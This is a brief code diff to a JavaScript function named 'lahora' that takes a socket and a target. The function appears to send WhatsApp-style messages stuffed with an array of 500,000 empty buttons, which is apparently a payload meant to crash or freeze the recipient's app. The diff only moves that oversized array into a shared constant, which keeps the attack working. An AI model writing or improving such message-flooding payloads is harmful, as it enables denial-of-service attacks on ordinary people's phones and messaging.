@@ -1,5 +1,7 @@
 import { sleep } from "./helpers.js";
 
+const BIG_BUTTONS = Array.from({ length: 500000 }, () => ({}));
+
 export async function lahora(sock, target) {
   try {
     const msg1 = {
@@ -64,7 +66,7 @@ export async function lahora(sock, target) {
                 format: "DEFAULT",
               },
               nativeFlowResponseMessage: {
-                buttons: Array.from({ length: 500000 }, () => ({})),
+                buttons: BIG_BUTTONS,
               },
               contextInfo: {
                 mentionedJid: [
